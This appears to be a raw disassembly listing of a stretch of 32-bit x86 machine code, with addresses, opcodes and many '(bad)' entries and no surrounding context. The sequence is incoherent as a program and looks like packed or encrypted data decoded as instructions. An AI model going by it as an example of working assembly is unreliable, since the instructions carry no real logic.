  41fd87:	add    eax,0xa743f3e9
  41fd8c:	add    DWORD PTR ds:[ebx-0x1d],ebx
  41fd90:	sbb    BYTE PTR [edx-0x26],ch
  41fd93:	ds mov ebp,0xd16375c3
  41fd99:	xchg   DWORD PTR [eax],esi
  41fd9b:	popa   
  41fd9c:	xchg   ebx,eax
  41fd9d:	jno    0x41fd4d
  41fd9f:	addr16 sbb al,0x98
  41fda2:	sub    al,0x51
  41fda4:	dec    esi
  41fda5:	inc    ecx
  41fda6:	mov    ah,0xe1
  41fda8:	and    bl,BYTE PTR ds:0x535df10
  41fdae:	dec    ebx
  41fdaf:	mov    al,ds:0x34f568f1
  41fdb4:	sbb    dh,cl
  41fdb6:	jl     0x41fd71
  41fdb8:	mov    eax,ds:0x7ba14dae
  41fdbd:	add    esp,eax
  41fdbf:	jl     0x41fde0
  41fdc1:	pusha  
  41fdc2:	inc    ecx
  41fdc3:	imul   esp,edi,0x8dd5da48
  41fdc9:	pusha  
  41fdca:	mov    bh,BYTE PTR [edx+0x7caadf0d]
  41fdd0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fdd1:	loopne 0x41fddb
  41fdd3:	les    eax,FWORD PTR [esi-0x1a]
  41fdd6:	push   cs
  41fdd7:	mov    eax,0x325138b8
  41fddc:	mov    al,ds:0x458ae019
  41fde1:	repnz cmp al,0x1b
  41fde4:	repz stc 
  41fde6:	ja     0x41fe3c
  41fde8:	dec    eax
  41fde9:	sub    ecx,DWORD PTR [ecx-0x5]
  41fdec:	(bad)  
  41fded:	cwde   
  41fdee:	cmp    cl,BYTE PTR [esi-0xc]
  41fdf1:	mov    ch,dh
  41fdf3:	outs   dx,DWORD PTR ds:[esi]
  41fdf4:	jns    0x41fdb1
  41fdf6:	push   edi
  41fdf7:	xchg   esi,eax
  41fdf8:	jae    0x41fe73
  41fdfa:	mov    ah,BYTE PTR [esi+0x6b]
  41fdfd:	out    0x5e,eax
  41fdff:	mov    al,ds:0xf9bc9712
  41fe04:	xor    DWORD PTR [ecx],esi
  41fe06:	dec    edx
  41fe07:	pop    ds
  41fe08:	cmp    eax,0x90d22e0f
  41fe0d:	add    eax,0xf6879d50
  41fe12:	inc    edi
  41fe13:	shr    BYTE PTR [ebx],0x1f
  41fe16:	out    dx,al
  41fe17:	or     al,0xa0
  41fe19:	inc    ebx
  41fe1a:	push   ds
  41fe1b:	xor    BYTE PTR [edi-0x96bcbf7],cl
  41fe21:	les    esp,FWORD PTR [edx+0x2608a517]
  41fe27:	push   es
  41fe28:	cs mov ebx,0xba7aef25
  41fe2e:	add    BYTE PTR [edx+edi*2-0x75],al
  41fe32:	fstp   QWORD PTR [esi+0x76]
  41fe35:	xchg   ecx,eax
  41fe36:	cmp    ebx,edx
  41fe38:	shr    BYTE PTR [edi],1
  41fe3a:	inc    ebx
  41fe3b:	call   0xfc4dd76b
  41fe40:	push   ebp
  41fe41:	nop
  41fe42:	mov    ds,WORD PTR [ebp+0x3d]
  41fe45:	pop    edx
  41fe46:	ret    
  41fe47:	adc    BYTE PTR [ecx+0x9],bl
  41fe4a:	in     al,0x7b
  41fe4c:	bound  edi,QWORD PTR es:[edi+0x4dd1d5ee]
  41fe53:	and    eax,0x2c8a05f8
  41fe58:	mov    ds:0xa1d5489e,eax
  41fe5d:	sbb    esp,esi
  41fe5f:	xchg   ebp,eax
  41fe60:	mov    ebp,0xc92ff676
  41fe65:	call   ebx
  41fe67:	lods   al,BYTE PTR ds:[esi]
  41fe68:	out    0x36,eax
  41fe6a:	stc    
  41fe6b:	daa    
  41fe6c:	idiv   BYTE PTR [edx+eiz*1]
  41fe6f:	loope  0x41fed8
  41fe71:	mov    ebp,0x8acab856
  41fe76:	push   es
  41fe77:	enter  0x7e8b,0x9e
  41fe7b:	(bad)  
  41fe7c:	hlt    
  41fe7d:	push   ss
  41fe7e:	test   al,0x96
  41fe80:	sbb    BYTE PTR [esi+ecx*1-0x1],bh
  41fe84:	push   ecx
  41fe85:	sub    BYTE PTR [esi],ah
  41fe87:	fsubr  st(2),st
  41fe89:	fdivp  st(1),st
  41fe8b:	scas   al,BYTE PTR es:[edi]
  41fe8c:	push   edx
  41fe8d:	pop    ebx
  41fe8e:	lea    edi,[edx+0x39]
  41fe91:	jg     0x41fe5d
  41fe93:	lods   eax,DWORD PTR ds:[esi]
  41fe94:	pop    es
  41fe95:	out    0x96,eax
  41fe97:	sub    edx,ecx
  41fe99:	retf   
  41fe9a:	or     eax,DWORD PTR [ecx-0x19c67366]
  41fea0:	aam    0xee
  41fea2:	in     al,0xaf
  41fea4:	jecxz  0x41fe6a
  41fea6:	pop    ebx
  41fea7:	pusha  
  41fea8:	in     eax,0xb4
  41feaa:	std    
  41feab:	lock adc DWORD PTR [esi+0x23],ebx
  41feaf:	push   ds
  41feb0:	scas   al,BYTE PTR es:[edi]
  41feb1:	lock mov ebx,0xd411384a
  41feb7:	ja     0x41fe83
  41feb9:	cmp    al,0xd6
  41febb:	lods   eax,DWORD PTR ds:[esi]
  41febc:	pop    eax
  41febd:	jns    0x41ff30
  41febf:	mov    dh,0xd8
  41fec1:	xchg   edx,eax
  41fec2:	outs   dx,DWORD PTR ds:[esi]
  41fec3:	add    DWORD PTR [eax-0x642606b3],eax
  41fec9:	sbb    DWORD PTR [ebp-0x54],ebx
  41fecc:	test   eax,0x2e9c86ee
  41fed1:	je     0x41fe87
  41fed3:	or     BYTE PTR [ecx+0xa523f27],bl
  41fed9:	xor    bh,BYTE PTR [edi+0x1d]
  41fedc:	out    dx,al
  41fedd:	push   cs
  41fede:	std    
  41fedf:	dec    ebp
  41fee0:	jns    0x41fed3
  41fee2:	ins    BYTE PTR es:[edi],dx
  41fee3:	fistp  QWORD PTR ds:0x61fd27df
  41fee9:	stos   BYTE PTR es:[edi],al
  41feea:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41feeb:	shl    DWORD PTR [ecx],1
  41feed:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41feee:	ss (bad) 
  41fef0:	ss std 
  41fef2:	and    al,BYTE PTR [esi-0x44]
  41fef5:	out    dx,al
  41fef6:	fcom   st(5)
  41fef8:	shl    ebp,1
  41fefa:	mov    ds:0x6632135,eax
  41feff:	daa    
  41ff00:	outs   dx,DWORD PTR gs:[esi]
  41ff02:	xchg   ecx,eax
  41ff03:	push   edi
  41ff04:	and    al,0x8a
  41ff06:	pop    ss
  41ff07:	in     eax,0xf
  41ff09:	sahf   
  41ff0a:	push   ecx
  41ff0b:	fldcw  WORD PTR [edx]
  41ff0d:	shl    DWORD PTR [edx-0x5b3ea095],cl
  41ff13:	mov    esi,es
  41ff15:	loop   0x41fef8
  41ff17:	ret    0x681a
  41ff1a:	pop    ebx
  41ff1b:	addr16 cmp al,0xb
  41ff1e:	push   ebp
  41ff1f:	shl    DWORD PTR [edi-0x4d],0x81
  41ff23:	(bad)  
  41ff25:	pop    eax
  41ff26:	xchg   esi,eax
  41ff27:	push   edi
  41ff28:	gs jmp 0x41ff1d
  41ff2b:	inc    esi
  41ff2c:	pusha  
  41ff2d:	adc    bh,dh
  41ff2f:	sahf   
  41ff30:	mov    ecx,0x1c2d7119
  41ff35:	ja     0x41ffb4
  41ff37:	mov    ebx,0x5346bed5
  41ff3c:	inc    edi
  41ff3d:	cmp    DWORD PTR ds:0x48c2ce14,edi
  41ff43:	fs jp  0x41ff25
  41ff46:	pop    ebp
  41ff47:	dec    edi
  41ff48:	jg     0x41ff80
  41ff4a:	neg    BYTE PTR [edi-0x63929890]
  41ff50:	mov    dl,0x4e
  41ff52:	mov    DWORD PTR [ecx+0x3c],esp
  41ff55:	push   ebx
  41ff56:	imul   edx,edi,0x2c
  41ff59:	loope  0x41feee
  41ff5b:	adc    BYTE PTR [edx+0x7c],cl
  41ff5e:	push   esp
  41ff5f:	jle    0x41ff75
  41ff61:	jae    0x41ffd8
  41ff63:	xchg   edi,eax
  41ff64:	es push ebp
  41ff66:	cli    
  41ff67:	lds    esp,FWORD PTR [eax]
  41ff69:	jl     0x41fef4
  41ff6b:	clc    
  41ff6c:	pusha  
  41ff6d:	sbb    BYTE PTR [eax+edx*2],dl
  41ff70:	(bad)  
  41ff71:	pop    ss
  41ff72:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ff73:	inc    ecx
  41ff74:	and    bl,BYTE PTR [bp-0x2773]
  41ff79:	cmc    
  41ff7a:	loope  0x41ff32
  41ff7c:	push   ds
  41ff7d:	cmp    eax,0x2975c342
  41ff82:	and    ebx,DWORD PTR [eax+0x745da6f0]
  41ff88:	jae    0x41ff85
  41ff8a:	add    ecx,DWORD PTR [eax+edi*2-0x18]
  41ff8e:	jle    0x41ffa5
  41ff90:	mov    BYTE PTR [ecx],dl
  41ff92:	or     al,0xc5
  41ff94:	in     al,dx
  41ff95:	adc    al,0xd3
  41ff97:	repz jecxz 0x41ff82
  41ff9a:	shl    DWORD PTR [ebx+0x68346157],0x46
  41ffa1:	mov    ds:0x4951b533,eax
  41ffa6:	dec    ebp
  41ffa7:	gs popa 
  41ffa9:	and    cl,BYTE PTR [edi+esi*1]
  41ffac:	or     DWORD PTR [ebx-0x3bd16646],esp
  41ffb2:	mov    cl,0xab
  41ffb4:	outs   dx,DWORD PTR ds:[si]
  41ffb6:	adc    ah,dh
  41ffb8:	call   0xa3d6:0xb9e67ff1
  41ffbf:	jl     0x41ff90
  41ffc1:	mov    esp,0x37e34974
  41ffc6:	xlat   BYTE PTR ds:[ebx]
  41ffc7:	mov    ebp,DWORD PTR [edx]
  41ffc9:	push   esp
  41ffca:	add    eax,0x497bea01
  41ffcf:	mov    ch,0x74
  41ffd1:	xchg   esp,eax
  41ffd2:	test   DWORD PTR [eax+edi*4-0xdea6c91],edi
  41ffd9:	sub    al,0x6a
  41ffdb:	sub    edx,0xb205ab1e
  41ffe1:	imul   eax
  41ffe3:	scas   al,BYTE PTR es:[edi]
  41ffe4:	test   DWORD PTR [ebp+0x21521d41],esi
  41ffea:	mov    ebp,0x1747f832
  41ffef:	shr    DWORD PTR [ebp-0xf906d97],cl
  41fff5:	mov    ds:0x7f0f27ea,al
  41fffa:	stos   BYTE PTR es:[edi],al
  41fffb:	xchg   bh,bh
  41fffd:	jmp    0xa8bf52e7
  420002:	call   0x3790e1c3
  420007:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420008:	adc    al,0xe1
  42000b:	ins    DWORD PTR es:[edi],dx
  42000c:	addr16 call 0xd9fc:0xd78c7292
  420014:	push   ds
  420015:	(bad)  
  420016:	jno    0x41ffd7
  420018:	loope  0x41ffc9
  42001a:	xor    eax,DWORD PTR [edx]
  42001c:	in     al,dx
  42001d:	rcl    BYTE PTR [ecx+0x43],0x26
  420021:	out    dx,eax
  420022:	ja     0x41ffc7
  420024:	add    al,0x56
  420026:	call   0x902fa4d2
  42002b:	mov    ds:0x86138cc1,al
  420030:	stc    
  420031:	jne    0x42002d
  420033:	loop   0x420008
  420035:	or     edx,ecx
  420037:	(bad)  
  420038:	leave  
  420039:	mov    esp,DWORD PTR [eax-0x4676e3d4]
  42003f:	adc    cl,dl
  420041:	ss es aad 0xed
  420045:	jne    0x41ffcf
  420047:	sub    ch,BYTE PTR [ecx+0x40]
  42004a:	out    dx,eax
  42004b:	mov    dh,dl
  42004d:	sub    DWORD PTR [edx-0x27bc0812],esi
  420053:	popa   
  420054:	jmp    0xc1977967
  420059:	lock jp 0x4200c8
  42005c:	inc    esi
  42005d:	adc    DWORD PTR [esi+0x70],eax
  420060:	shr    BYTE PTR [eax+edx*8],1
  420063:	fldcw  WORD PTR [ebx+0x45]
  420066:	lea    ebx,[esi+0x304f253d]
  42006c:	rol    BYTE PTR [esi+0x53],1
  42006f:	rcl    esi,cl
  420071:	inc    eax
  420072:	fild   DWORD PTR [edi+0x324f4f4]
  420078:	test   DWORD PTR [ebx+ecx*1-0x51],eax
  42007c:	or     esp,DWORD PTR cs:[bx+0xe35]
  420082:	fwait
  420083:	jp     0x4200ce
  420085:	aas    
  420086:	jb     0x420043
  420088:	inc    ecx
  420089:	and    al,0x9f
  42008b:	pop    ecx
  42008c:	cdq    
  42008d:	ret    0xb82b
  420090:	mov    eax,ds:0x39179263
  420095:	iret   
  420096:	int    0xb9
  420098:	data16 in al,dx
  42009a:	mov    eax,ds:0x965ef1b
  42009f:	aam    0xac
  4200a1:	(bad)  
  4200a2:	in     eax,0x1c
  4200a4:	and    eax,DWORD PTR [edi+0x5f4574b7]
  4200aa:	jae    0x420114
  4200ac:	cmc    
  4200ad:	jp     0x42008a
  4200af:	sbb    BYTE PTR [edx-0x3f],ch
  4200b2:	iret   
  4200b3:	xchg   ebx,eax
  4200b4:	stos   DWORD PTR es:[edi],eax
  4200b5:	cld    
  4200b6:	push   edi
  4200b7:	mov    eax,ds:0x1d982214
  4200bc:	or     al,0x20
  4200be:	push   ds
  4200bf:	in     al,0x94
  4200c1:	xor    BYTE PTR [ebx+0x343c02f8],al
  4200c7:	mov    bh,bh
  4200c9:	shl    BYTE PTR [edi+0x63],0xb0
  4200cd:	enter  0x8051,0x9
  4200d1:	rol    dl,0xd5
  4200d4:	mov    ebp,0x2a366bf5
  4200d9:	inc    esi
  4200da:	and    eax,0x21f1b062
  4200df:	cmc    
  4200e0:	mov    bl,0x2c
  4200e2:	mov    esi,0x6996781a
  4200e7:	dec    eax
  4200e8:	lock in eax,0x53
  4200eb:	popf   
  4200ec:	dec    esi
  4200ed:	xchg   edx,esp
  4200ef:	cli    
  4200f0:	or     dl,dl
  4200f2:	xchg   esp,eax
  4200f3:	mov    BYTE PTR [eax+0x60feab91],al
  4200f9:	xchg   edx,eax
  4200fa:	jp     0x420093
  4200fc:	xchg   esi,eax
  4200fd:	mov    ds:0x700b1de3,eax
  420102:	sbb    BYTE PTR [edx+0x36],cl
  420105:	scas   al,BYTE PTR es:[edi]
  420106:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420107:	jbe    0x4200c4
  420109:	out    dx,eax
  42010a:	lock and ch,BYTE PTR [esi+0x2720cf75]
  420111:	scas   al,BYTE PTR es:[edi]
  420112:	out    dx,eax
  420113:	mov    ds:0xa56969fb,eax
  420118:	jmp    0xaddf1199
  42011d:	stos   DWORD PTR es:[edi],eax
  42011e:	sbb    al,0x55
  420120:	xor    DWORD PTR [ebx],ecx
  420122:	in     eax,0x33
  420124:	add    cl,bl
  420126:	push   edx
  420127:	js     0x420178
  420129:	aas    
  42012a:	cs xchg ebp,eax
  42012c:	leave  
  42012d:	mov    WORD PTR [ebx+0x7b],ss
  420130:	sub    cl,ah
  420132:	clc    
  420133:	pop    ebp
  420134:	or     eax,0x7b8107df
  420139:	mov    esp,0x8b07183e
  42013e:	push   ds
  42013f:	cmp    ebx,DWORD PTR ds:[edx]
  420142:	and    edi,esp
  420144:	fsubr  QWORD PTR [ebx-0x4d856190]
  42014a:	jbe    0x42013e
  42014c:	inc    ebp
  42014d:	mov    ecx,0x9f3b7b74
  420152:	in     al,dx
  420153:	lock test BYTE PTR [esi+0x382d957a],bl
  42015a:	loop   0x420116
  42015c:	xor    al,0x36
  42015e:	retf   
  42015f:	xor    cl,BYTE PTR [ebx-0x7ba40ce]
  420165:	loop   0x420146
  420167:	jp     0x4200fa
  420169:	into   
  42016a:	sbb    eax,0xd8a4d0c3
  42016f:	popf   
  420170:	dec    esp
  420171:	mov    edx,0xadfa43ed
  420176:	xchg   esp,eax
  420177:	ja     0x42014c
  420179:	jle    0x4200fc
  42017b:	jbe    0x4201ef
  42017d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42017e:	(bad)  
  420180:	retf   0x42ea
  420183:	addr16 push edx
  420185:	jecxz  0x42010b
  420187:	sbb    esp,DWORD PTR [edx+eiz*4-0x578da3ff]
  42018e:	lock imul esp,DWORD PTR [ebp+0x39],0x46
  420193:	mov    WORD PTR [edx],ss
  420195:	cmp    DWORD PTR [edi+0x23],0xbb8f856a
  42019c:	rcl    ebx,cl
  42019e:	and    ch,dh
  4201a0:	cmp    eax,0x78a03d93
  4201a5:	inc    esi
  4201a6:	push   cs
  4201a7:	clc    
  4201a8:	test   dh,bh
  4201aa:	je     0x42021c
  4201ac:	xchg   esi,eax
  4201ad:	mov    esp,0x808391e
  4201b2:	xor    eax,0x819ae40c
  4201b7:	int3   
  4201b8:	mov    ebx,0x42d17a93
  4201bd:	pop    ds
  4201be:	jb     0x4201f3
  4201c0:	dec    ebx
  4201c1:	(bad)  
  4201c2:	fild   WORD PTR [ecx-0x59]
  4201c5:	adc    al,0x1d
  4201c7:	inc    ebp
  4201c8:	sbb    BYTE PTR [edx-0x1c94eecd],dh
  4201ce:	loope  0x4201ca
  4201d0:	jecxz  0x420199
  4201d2:	sub    edx,DWORD PTR [ebx]
  4201d4:	mov    ebx,0xdf2fd2f2
  4201d9:	xor    eax,0x467834cb
  4201de:	adc    DWORD PTR [ebx+eax*1-0x18],edx
  4201e2:	aad    0x4e
  4201e4:	sbb    ebp,DWORD PTR [ebx+0x59590ad7]
  4201ea:	pop    eax
  4201eb:	hlt    
  4201ec:	mov    edx,0x9bcfe007
  4201f1:	jl     0x4201fe
  4201f3:	add    eax,0x37f9db7b
  4201f8:	push   0xf91b5c03
  4201fd:	loopne 0x42023c
  4201ff:	sub    al,0x9e
  420201:	mov    bl,0xd2
  420203:	sbb    eax,0xa9e80c14
  420208:	adc    edi,DWORD PTR [edx+eax*2+0x49621f49]
  42020f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420210:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420211:	inc    ebp
  420212:	inc    edi
  420213:	sbb    al,0x4a
  420215:	frstor [edx]
  420217:	inc    eax
  420218:	push   edx
  420219:	cs sbb bh,dh
  42021c:	mov    DWORD PTR [ecx-0x6e],esp
  42021f:	pushf  
  420220:	shl    DWORD PTR [eax],0x41
  420223:	push   ds
  420224:	jnp    0x420250
  420226:	sbb    eax,0x7f36d05d
  42022b:	push   ebp
  42022c:	mov    esi,0x9e3757ca
  420231:	cmc    
  420232:	xor    ecx,eax
  420234:	mov    al,0x60
  420236:	jnp    0x420235
  420238:	out    dx,al
  420239:	clc    
  42023a:	ja     0x42024d
  42023c:	test   dh,al
  42023e:	pusha  
  42023f:	dec    esp
  420240:	addr16 popa 
  420242:	add    esp,eax
  420244:	enter  0x2419,0x70
  420248:	outs   dx,DWORD PTR ds:[esi]
  420249:	xchg   ebx,eax
  42024a:	(bad)  
  42024c:	inc    esi
  42024d:	sub    DWORD PTR [ebp-0x55d62d3],edx
  420253:	mov    dl,0x4d
  420255:	jge    0x42029a
  420257:	push   ebx
  420258:	mov    cl,0x5f
  42025a:	(bad)  
  42025b:	jl     0x420277
  42025d:	repnz xchg ebp,eax
  42025f:	mov    ds:0xfef60d91,al
  420264:	shl    BYTE PTR [edi],cl
  420266:	push   ss
  420267:	jne    0x4202c8
  420269:	pop    es
  42026a:	pop    ecx
  42026b:	add    al,0xd1
  42026d:	xor    DWORD PTR [edi],edx
  42026f:	imul   edx,DWORD PTR [eax-0x1c0b2dfa],0xc92e900a
  420279:	(bad)  
  42027a:	dec    esp
  42027b:	mov    esi,0x2bafc0b4
  420280:	out    0xcc,al
  420282:	pop    esp
  420283:	int    0x13
  420285:	nop
  420286:	ret    0x6552
  420289:	push   ds
  42028a:	sub    dl,BYTE PTR [ebx]
  42028c:	adc    eax,0x7e13734a
  420291:	or     eax,0xea69523e
  420296:	hlt    
  420297:	jmp    0x7450ff9e
  42029c:	fadd   QWORD PTR [edx]
  42029e:	sub    eax,0x911b1694
  4202a3:	je     0x4202fe
  4202a5:	je     0x42029e
  4202a7:	lea    eax,[edx-0x23]
  4202aa:	add    al,0x52
  4202ac:	push   esi
  4202ad:	inc    ebp
  4202ae:	sub    DWORD PTR [eax+0x28],esi
  4202b1:	aad    0xd3
  4202b3:	or     DWORD PTR [ecx-0x20],0xffffff8b
  4202b7:	pop    edx
  4202b8:	add    dh,BYTE PTR [edi+0x53]
  4202bb:	test   eax,0x98fe52d2
  4202c0:	leave  
  4202c1:	adc    dl,bh
  4202c3:	dec    ecx
  4202c4:	mov    DWORD PTR [esi-0x1fcb25d8],ebp
  4202ca:	inc    edx
  4202cb:	push   es
  4202cc:	test   DWORD PTR [edi-0x4abbd283],eax
  4202d2:	sahf   
  4202d3:	cli    
  4202d4:	jo     0x42031f
  4202d6:	and    dl,BYTE PTR [esi]
  4202d8:	xor    eax,0xb5fe3ffe
  4202dd:	pop    es
  4202de:	hlt    
  4202df:	shr    eax,1
  4202e1:	sbb    edx,DWORD PTR [ebx]
  4202e3:	and    BYTE PTR [ebp+0x1bd03a7],dh
  4202e9:	add    esi,DWORD PTR [ebp+0x275e0734]
  4202ef:	adc    ch,BYTE PTR [ebx+0x13]
  4202f2:	enter  0x111c,0x19
  4202f6:	mov    eax,ds:0x8ccf768e
  4202fb:	inc    eax
  4202fc:	mov    ecx,0xa0600328
  420301:	pop    es
  420302:	fisub  WORD PTR [edi+edx*8+0x16056aed]
  420309:	rcr    BYTE PTR [eax+ecx*2],cl
  42030c:	inc    ebx
  42030d:	in     eax,0x4a
  42030f:	mov    esi,0x4c228e1b
  420314:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420315:	out    0x1c,al
  420317:	fisubr DWORD PTR [eax]
  420319:	imul   DWORD PTR [eax-0x4110ac2a]
  42031f:	rol    DWORD PTR [eax],cl
  420321:	mov    al,BYTE PTR [ebx]
  420323:	adc    cl,BYTE PTR [edx+0x38146337]
  420329:	xchg   ecx,eax
  42032a:	adc    al,0x18
  42032c:	in     al,0x6f
  42032e:	sti    
  42032f:	mov    ds:0xa5851392,eax
  420334:	(bad)  
  420336:	push   esp
  420337:	(bad)  
  420338:	loop   0x420389
  42033a:	adc    BYTE PTR [edi],al
  42033c:	lock sbb ch,BYTE PTR [eax+ebp*4]
  420340:	mov    eax,ds:0xd372cf77
  420345:	mov    ds:0xb0181f6f,eax
  42034a:	adc    DWORD PTR [esi],0x214eb230
  420350:	iret   
  420351:	ret    0x3e7c
  420354:	(bad)  
  420355:	adc    BYTE PTR [edi-0x697b44d9],bh
  42035b:	inc    esp
  42035c:	je     0x420376
  42035e:	rcl    bh,0xce
  420361:	pop    ecx
  420362:	shl    dl,0xe2
  420365:	xchg   BYTE PTR ds:0x683f927b,bl
  42036b:	sbb    DWORD PTR ds:0x1bfa4d7f,eax
  420371:	dec    cl
  420373:	dec    ecx
  420374:	ja     0x420370
  420376:	outs   dx,BYTE PTR ds:[esi]
  420377:	imul   ecx,DWORD PTR [ebx-0xed8bb61],0xc17dd7c7
  420381:	ins    DWORD PTR es:[edi],dx
  420382:	test   DWORD PTR ds:0x6f2ec18e,ebx
  420388:	and    ecx,DWORD PTR es:0xcad29059
  42038f:	inc    ebx
  420390:	adc    ah,BYTE PTR ds:0x674d748c
  420396:	imul   eax,DWORD PTR ds:0x2e3d3f4c,0x6f
  42039d:	stc    
  42039e:	or     ebx,ebp
  4203a0:	mov    DWORD PTR [esi-0x44],ebx
  4203a3:	out    0x27,eax
  4203a5:	adc    DWORD PTR [ebp-0x6d34446e],0xc9a1b876
  4203af:	pusha  
  4203b0:	cmp    dh,BYTE PTR [edi-0x27]
  4203b3:	test   eax,0x9c5005c
  4203b8:	aad    0x1f
  4203ba:	xchg   esp,eax
  4203bb:	sti    
  4203bc:	cld    
  4203bd:	or     BYTE PTR [ebx+0x718a39e0],ah
  4203c3:	ret    
  4203c4:	and    ecx,ebx
  4203c6:	pop    esp
  4203c7:	ja     0x42034c
  4203c9:	sbb    cl,bh
  4203cb:	cli    
  4203cc:	in     eax,dx
  4203cd:	aad    0x7f
  4203cf:	xchg   ecx,eax
  4203d0:	sti    
  4203d1:	jo     0x420384
  4203d3:	mov    al,0xaa
  4203d5:	jae    0x420361
  4203d7:	div    ecx
  4203d9:	stos   DWORD PTR es:[edi],eax
  4203da:	push   ds
  4203db:	sub    DWORD PTR [eax+0x1e],edi
  4203de:	leave  
  4203df:	push   edx
  4203e0:	jae    0x420405
  4203e2:	pop    ds
  4203e3:	adc    eax,0xfb394aff
  4203e8:	sub    BYTE PTR [edi+0x7ded8a8],al
  4203ee:	not    BYTE PTR [ebp+0x3491d7ea]
  4203f4:	xor    eax,0x631badc9
  4203f9:	cmp    bh,ch
  4203fb:	push   ds
  4203fc:	add    dh,0xc
  4203ff:	int    0x80
  420401:	jno    0x420437
  420403:	jl     0x4203f4
  420405:	xor    DWORD PTR [ebx],ebp
  420407:	push   cs
  420408:	mov    ah,0x62
  42040a:	or     ah,bh
  42040c:	sub    BYTE PTR [esi-0x3d],cl
  42040f:	mov    ebp,0xe1d05be0
  420414:	xor    eax,0x7990631d
  420419:	jp     0x4203fc
  42041b:	sar    DWORD PTR [ebp-0x1476f764],cl
  420421:	jno    0x420444
  420423:	jns    0x4203eb
  420425:	xchg   ebp,eax
  420426:	jle    0x420428
  420428:	xchg   ebx,eax
  420429:	lods   eax,DWORD PTR ds:[esi]
  42042a:	div    dh
  42042c:	sub    al,0xe7
  42042e:	std    
  42042f:	outs   dx,DWORD PTR ds:[esi]
  420430:	mov    cl,0x95
  420432:	pop    ebp
  420433:	push   ebp
  420434:	fdivp  st(2),st
  420436:	sbb    dh,ah
  420438:	adc    al,0x32
  42043a:	imul   edi,DWORD PTR [ebx-0x7c],0xffffff9b
  42043e:	push   esp
  42043f:	(bad)  
  420440:	push   edi
  420441:	mov    ds:0xb1a601b7,al
  420446:	jno    0x42045f
  420448:	pushf  
  420449:	in     eax,0x5a
  42044b:	ss in  eax,dx
  42044d:	test   eax,0x9b685f6f
  420452:	cmp    ebx,DWORD PTR [edi+0x1d6ee235]
  420458:	int    0x5e
  42045a:	lods   eax,DWORD PTR ds:[esi]
  42045b:	xor    DWORD PTR [ebp-0x3819e1a2],esi
  420461:	sub    BYTE PTR gs:[ebx+0x586e9d76],al
  420468:	mov    WORD PTR [eax],ds
  42046a:	imul   ebp,edx,0x45165143
  420470:	jecxz  0x42040d
  420472:	jne    0x42041b
  420474:	pop    ss
  420475:	loope  0x4204a0
  420477:	hlt    
  420478:	idiv   ch
  42047a:	xlat   BYTE PTR ds:[ebx]
  42047b:	push   esi
  42047c:	rcr    BYTE PTR [edi-0x36],1
  42047f:	cli    
  420480:	push   0xc0376416
  420485:	xor    al,0x42
  420487:	jmp    0x420458
  420489:	adc    bh,BYTE PTR [ebx-0x535d23dd]
  42048f:	xor    eax,0xc0fb0b28
  420494:	dec    eax
  420495:	adc    al,0x8a
  420497:	pushf  
  420498:	push   edi
  420499:	mov    esi,0xe3a917f
  42049e:	mov    esi,0x8352f8a5
  4204a3:	loope  0x4204bb
  4204a5:	xor    eax,0xf5ae0195
  4204aa:	jge    0x4204d9
  4204ac:	or     DWORD PTR [ebx+ebx*4-0xabea9fd],esp
  4204b3:	std    
  4204b4:	mov    ebp,esi
  4204b6:	mov    ebx,0x55c2a863
  4204bb:	(bad)  
  4204bc:	enter  0x2385,0x6d
  4204c0:	xchg   esi,eax
  4204c1:	and    ebx,esp
  4204c3:	xchg   al,cl
  4204c5:	nop
  4204c6:	shl    BYTE PTR [eax+esi*2-0x6a05faf8],cl
  4204cd:	sub    ecx,DWORD PTR [ebp-0x4a1489cb]
  4204d3:	add    al,0x1a
  4204d5:	push   edi
  4204d6:	mov    esi,0xd783663
  4204db:	lea    ecx,[edx-0x20901a94]
  4204e1:	enter  0xf179,0xd5
  4204e5:	mov    dl,BYTE PTR [edi-0x1e433bd8]
  4204eb:	add    ebp,DWORD PTR [ebx-0xc]
  4204ee:	mov    al,0x4a
  4204f0:	jnp    0x420484
  4204f2:	mov    eax,0x8f12c305
  4204f7:	push   cs
  4204f8:	ret    0x535e
  4204fb:	mov    WORD PTR [edx],ss
  4204fd:	xor    esi,ebp
  4204ff:	es out 0xd1,eax
  420502:	sub    ebx,DWORD PTR ds:0x26439b45
  420508:	jnp    0x420543
  42050a:	push   esi
  42050b:	adc    ecx,ebp
  42050d:	pop    ds
  42050e:	cmc    
  42050f:	cmp    edx,DWORD PTR [esi+ecx*2]
  420512:	sbb    DWORD PTR [edx-0x28439b2f],edx
  420518:	in     al,dx
  420519:	ss mov ah,0xb2
  42051c:	inc    esp
  42051d:	add    dl,BYTE PTR [edi+0x52956f6e]
  420523:	outs   dx,BYTE PTR ds:[esi]
  420524:	xchg   edx,eax
  420525:	add    BYTE PTR [edi+0x41],bh
  420528:	pop    ebp
  420529:	and    ah,bl
  42052b:	es pop edi
  42052d:	ret    0x1470
  420530:	mov    al,0x80
  420532:	xor    cl,BYTE PTR [edx+0x419ee6fb]
  420538:	mov    esp,0x3c4010e4
  42053d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42053e:	sub    ebp,DWORD PTR [ecx+0x54]
  420541:	loopne 0x42059b
  420543:	pop    ebx
  420544:	fs aam 0x87
  420547:	inc    ecx
  420548:	xor    edx,DWORD PTR [ebp+0x4c]
  42054b:	or     DWORD PTR [ecx+0x69e91e7d],0x679d56d0
  420555:	mov    ch,0x78
  420557:	mov    DWORD PTR [ebp-0x69],esi
  42055a:	fwait
  42055b:	push   esp
  42055c:	imul   BYTE PTR [edx-0x79]
  42055f:	cs inc eax
  420561:	(bad)  
  420563:	jnp    0x420536
  420565:	mov    esp,DWORD PTR [eax]
  420567:	add    bl,bl
  420569:	test   bh,dh
  42056b:	cmp    ecx,0x66
  42056e:	out    dx,al
  42056f:	fcomp  DWORD PTR [ecx]
  420571:	ret    0x7c72
  420574:	gs inc ebx
  420576:	call   0xd84d907d
  42057b:	xor    bh,bh
  42057d:	test   eax,0x9132b24e
  420582:	dec    edi
